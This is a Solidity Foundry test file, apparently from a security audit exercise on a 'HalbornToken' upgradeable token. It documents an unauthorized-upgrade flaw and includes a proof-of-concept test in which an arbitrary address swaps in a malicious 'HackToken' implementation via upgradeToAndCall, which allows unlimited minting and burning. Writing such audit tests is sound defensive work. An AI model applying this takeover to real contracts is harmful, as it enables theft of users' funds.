// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HackToken} from "../src/HackToken.sol";

contract HalbornToken_Test is Test {
    HalbornToken public token;
    ERC1967Proxy proxy;
    HalbornToken impl;

    address pankaj = address(0x777);

    function setUp() public {
        vm.startPrank(pankaj);
        impl = new HalbornToken();
        proxy = new ERC1967Proxy(address(impl), "");
        token = HalbornToken(address(proxy));
        token.initialize();
        token.setLoans(address(1));
    }
    /*
    BUG 1: Anyone can upgrade the contract to a malicious contract
     After upgrading to the malicious contract, 
     1. Loans address can be set to any address
     2. Unlimited minting of tokens
     3. Unlimited burning of tokens
    */

    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0x6969);
        vm.startPrank(unauthorizedUser);

        HackToken attack = new HackToken();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );
        token.initialize();
    }

    receive() external payable {}
}
